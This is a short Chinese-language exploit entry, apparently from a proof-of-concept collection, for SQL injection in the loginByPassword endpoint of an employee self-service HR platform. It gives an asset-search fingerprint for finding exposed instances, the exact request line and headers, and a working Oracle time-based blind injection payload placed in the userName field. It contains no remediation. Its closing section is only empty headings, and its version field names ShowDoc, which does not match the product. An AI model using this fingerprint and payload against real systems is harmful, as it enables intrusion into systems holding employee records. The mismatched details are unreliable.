# 员工自助平台loginByPassword存在SQL注入漏洞

- **系统**：员工自助平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="./static/hrfonts/iconfont.css"`
- **请求**：`POST /hrssc/portal/plantform/loginByPassword HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`Content-Length: 40`

**请求体 / payload**
```
{"userName":"admin' AND 8383=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)CHR(98)CHR(97)CHR(122),5)-- eWnt","password":"admin"}
```

**其他**
- 员工自助平台loginByPassword存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * ShowDoc